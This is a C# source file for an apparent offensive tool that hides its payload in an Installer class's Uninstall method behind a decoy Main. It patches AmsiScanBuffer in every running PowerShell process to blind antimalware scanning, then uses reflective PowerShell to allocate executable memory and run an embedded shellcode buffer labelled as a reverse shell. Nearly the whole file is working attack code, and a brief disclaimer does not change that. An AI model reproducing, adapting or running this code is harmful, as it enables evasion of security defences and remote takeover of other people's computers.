using System;
using System.Configuration.Install;
using System.Diagnostics;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Runtime.InteropServices;

namespace FullBypassInstaller
{
    internal class Installer
    {
       
        static void Main(string[] args)
        {
            Console.WriteLine("This is a main method which is a decoy");
        }
    }
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint floldProtect);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint dwSize, out int lpNumberOfBytesWritten);
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
           

            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            Console.WriteLine(noScan());

            string revShellcommand = @"function LookupFunc {

	            Param ($moduleName, $functionName)

	            $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
                Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
                  Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
                $tmp=@()
                $assem.GetMethods() | ForEach-Object {If($_.Name -eq 'GetProcAddress') {$tmp+=$_}}
	            return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
            }

            function getDelegateType {

	            Param (
		            [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		            [Parameter(Position = 1)] [Type] $delType = [Void]
	            )

	            $type = [AppDomain]::CurrentDomain.
                DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
                [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
                  DefineDynamicModule('InMemoryModule', $false).
                  DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
                  [System.MulticastDelegate])

              $type.
                DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
                  SetImplementationFlags('Runtime, Managed')

              $type.
                DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
                  SetImplementationFlags('Runtime, Managed')

	            return $type.CreateType()
            }

            $lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

            [Byte[]] $buf = 0x48,0x31,0xc9,0x48,0x81,0xe9,0xc0,0xff,0xff,0xff,0x48,0x8d,0x5,0xef,0xff,0xff,0xff,0x48,0xbb,0xab,0xe8,0x98,0xd9,0x85,0xaa,0xd8,0x6,0x48,0x31,0x58,0x27,0x48,0x2d,0xf8,0xff,0xff,0xff,0xe2,0xf4,0x57,0xa0,0x1b,0x3d,0x75,0x42,0x14,0x6,0xab,0xe8,0xd9,0x88,0xc4,0xfa,0x8a,0x4e,0x9a,0x3a,0xc9,0x8f,0xe0,0xe2,0x53,0x54,0xcb,0xa0,0x13,0x8b,0x9d,0xe2,0x53,0x54,0x8b,0xa0,0x97,0x6e,0xcf,0xe0,0x90,0x8d,0xd9,0xb8,0xd5,0xe8,0x4c,0xe2,0xe9,0xc6,0x7,0xd4,0xf9,0xa5,0x87,0x86,0xf8,0x47,0x6a,0x21,0x95,0x98,0x84,0x6b,0x3a,0xeb,0xf9,0xa0,0x13,0x8b,0xa5,0xeb,0x89,0x8d,0xe9,0xd4,0xd0,0xd8,0x55,0xcc,0x59,0x7e,0xb3,0xe3,0x9a,0xd6,0x0,0xd8,0xd8,0x6,0xab,0x63,0x18,0x51,0x85,0xaa,0xd8,0x4e,0x2e,0x28,0xec,0xbe,0xcd,0xab,0x8,0x56,0xef,0x63,0xd8,0xf9,0xe,0xe2,0xc0,0x4f,0xaa,0x38,0x7b,0x8f,0xcd,0x55,0x11,0x47,0x20,0xdc,0x10,0x94,0xb4,0x63,0x90,0x7,0x7d,0xa0,0xa9,0x19,0xc4,0x6b,0x11,0xb,0x7,0xa9,0x99,0x18,0xbd,0x4a,0xad,0xf7,0xe7,0xeb,0xd4,0xfd,0x8d,0xef,0xe1,0xd7,0xde,0x30,0xc0,0x9d,0xe,0xea,0xfc,0x4f,0xaa,0x38,0xfe,0x98,0xe,0xa6,0x90,0x42,0x20,0xa8,0x84,0x90,0x84,0x7a,0x99,0x8d,0xaf,0x60,0xd9,0x81,0xcd,0xab,0x8,0x47,0xf3,0xb6,0xc1,0x83,0xc4,0xf2,0x99,0x5f,0xea,0xb2,0xd0,0x5a,0x69,0x8a,0x99,0x54,0x54,0x8,0xc0,0x98,0xdc,0xf0,0x90,0x8d,0xb9,0x1,0xd3,0x26,0x7a,0x55,0x85,0x4f,0x15,0x9f,0xeb,0xeb,0xda,0x99,0xea,0x6,0xab,0xa9,0xce,0x90,0xc,0x4c,0x90,0x87,0x47,0x48,0x99,0xd9,0x85,0xe3,0x51,0xe3,0xe2,0x54,0x9a,0xd9,0x84,0x11,0x18,0xae,0x86,0x2e,0xd9,0x8d,0xcc,0x23,0x3c,0x4a,0x22,0x19,0xd9,0x63,0xc9,0xdd,0xfe,0x1,0x54,0x3d,0xd4,0x50,0x6f,0xc2,0xd9,0x7,0xab,0xe8,0xc1,0x98,0x3f,0x83,0x58,0x6d,0xab,0x17,0x4d,0xb3,0x8f,0xeb,0x86,0x56,0xfb,0xa5,0xa9,0x10,0xc8,0x9b,0x18,0x4e,0x54,0x28,0xd0,0x50,0x47,0xe2,0x27,0xc6,0xe3,0x61,0x59,0x98,0x3f,0x40,0xd7,0xd9,0x4b,0x17,0x4d,0x91,0xc,0x6d,0xb2,0x16,0xea,0xb0,0xd4,0x50,0x67,0xe2,0x51,0xff,0xea,0x52,0x1,0x7c,0xf1,0xcb,0x27,0xd3,0x2e,0x28,0xec,0xd3,0xcc,0x55,0x16,0x73,0x4e,0x0,0xb,0xd9,0x85,0xaa,0x90,0x85,0x47,0xf8,0xd0,0x50,0x67,0xe7,0xe9,0xcf,0xc1,0xec,0xd9,0x81,0xcd,0x23,0x21,0x47,0x11,0xea,0x41,0x11,0xda,0x55,0xd,0x85,0x53,0xe8,0xe6,0x8c,0xcd,0x29,0x1c,0x26,0xf5,0x61,0x6e,0xb3,0xc5,0xeb,0x81,0x6e,0xab,0xf8,0x98,0xd9,0xc4,0xf2,0x90,0x8f,0x59,0xa0,0xa9,0x10,0xc4,0x10,0x80,0xa2,0xf8,0xd,0x67,0xc,0xcd,0x23,0x1b,0x4f,0x22,0x2f,0xd5,0xe8,0x4c,0xe3,0x51,0xf6,0xe3,0x61,0x42,0x91,0xc,0x53,0x99,0xbc,0xa9,0x31,0x50,0x86,0x7a,0x7f,0x5b,0xfe,0xab,0x95,0xb0,0x81,0xc4,0xfd,0x81,0x6e,0xab,0xa8,0x98,0xd9,0xc4,0xf2,0xb2,0x6,0xf1,0xa9,0x22,0xd2,0xaa,0xa5,0xe8,0xf9,0x7e,0xbf,0xc1,0x98,0x3f,0xdf,0xb6,0x4b,0xca,0x17,0x4d,0x90,0x7a,0x64,0x31,0x3a,0x54,0x17,0x67,0x91,0x84,0x69,0x90,0x2f,0x6d,0xa0,0x1d,0x2f,0xf0,0x1e,0x99,0xf9,0x4c,0xb0,0xf2,0xd9,0xdc,0xe3,0x1f,0xc4,0x5b,0x5d,0x3a,0x8f,0x7a,0x7f,0xd8,0x6
            

            [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

            $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

            [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)";


            ps.AddScript(revShellcommand);
            ps.Invoke();
            rs.Close();
        }

        private static int noScan()
        {

            Console.WriteLine("Author: Shelldon");
            Console.WriteLine("github: github.com/Sh3lldon");
            Console.WriteLine("!!!! Please do not use in unethical hacking and follow all rules and regulations of laws!!!!");

            Process[] processes = Process.GetProcessesByName("powershell");
            if (processes.Length != 0)
            {
                Console.WriteLine("[+] Found " + processes.Length + " powershell processes\n");
            }
            else
            {
                Console.WriteLine("[-] Powershell process does not exist");
                Console.WriteLine("Please create powershell process");
                System.Environment.Exit(1);
            }

            int id = 0;
            bool res = false;
            for (int l = 0; l < processes.Length; l++)
            {

                id++;
                Console.WriteLine("#" + id);
                IntPtr hHandle = OpenProcess(0x001F0FFF, false, processes[l].Id);
                IntPtr baseAddress = IntPtr.Zero;
                IntPtr amsiScanBuffer = IntPtr.Zero;
                int moduleSize = 0;


                Console.WriteLine("[+] Powershell process id: " + processes[l].Id + " & handle: " + hHandle);
                foreach (ProcessModule processModule in processes[l].Modules)
                {
                    if (processModule.ModuleName == "amsi.dll")
                    {
                        Console.WriteLine("[+] Base address of amsi.dll: " + "0x" + processModule.BaseAddress.ToString("X"));
                        baseAddress = processModule.BaseAddress;
                        moduleSize = processModule.ModuleMemorySize;
                        Console.WriteLine("[+] Size of the module: 0x" + moduleSize.ToString("X"));
                    }
                }

                byte[] ret = new byte[32];
                // First 32 bytes of AmsiScanBuffer function
                byte[] fewBytes = new byte[32] { 0x4c, 0x8b, 0xdc, 0x49, 0x89, 0x5b, 0x08, 0x49, 0x89, 0x6b, 0x10, 0x49, 0x89, 0x73, 0x18, 0x57, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x70, 0x4d, 0x8b, 0xf9, 0x41, 0x8b, 0xf8, 0x48, 0x8b };
                IntPtr outt;
                bool addrScanBuffer = false;
                int count = 0;

                for (int i = 0; i <= moduleSize; i += fewBytes.Length)
                {
                    ReadProcessMemory(hHandle, baseAddress + i, ret, fewBytes.Length, out outt);
                    if (addrScanBuffer == true)
                    {
                        break;
                    }
                    for (int j = 0; j < fewBytes.Length; j++)
                    {
                        if (count == fewBytes.Length - 1)
                        {
                            amsiScanBuffer = baseAddress + i;
                            Console.WriteLine("[+] Found AmsiScanBuffer function: 0x" + amsiScanBuffer.ToString("X"));
                            res = false;
                            addrScanBuffer = true;
                            break;
                        }
                        if (fewBytes[j] == ret[j])
                        {
                            count++;
                        }
                        else if (fewBytes[j] != ret[j])
                        {
                            count = 0;
                            break;
                        }
                    }
                }
                if (count != fewBytes.Length - 1)
                {
                    Console.WriteLine("[-] Cannot find need bytes of AmsiScanBuffer function");
                    Console.WriteLine("Maybe you have already hijacked memory :)\n----------------------------------------------------------\n");
                    res = true;
                }
                if (res)
                {
                    continue;
                }

                uint lpflOldProtect;
                if (VirtualProtectEx(hHandle, baseAddress, (uint)0x1000, 0x40, out lpflOldProtect))
                {
                    Console.WriteLine("[+] Successfully changed memory protection");
                }
                else
                {
                    Console.WriteLine("[-] Changing memory protection failed");
                }

                byte[] hijack = new byte[3] { 0x31, 0xff, 0x90 };
                int numberOfBytesWritten = 0;
                if (WriteProcessMemory(hHandle, amsiScanBuffer + 0x1b, hijack, (uint)hijack.Length, out numberOfBytesWritten))
                {
                    Console.WriteLine("[+] Successfully hijacked\n----------------------------------------------------------\n");
                }
                else
                {
                    Console.WriteLine("[-] Hijacking failed\n----------------------------------------------------------\n");
                }

            }


            return 0;
        }
    }
    
}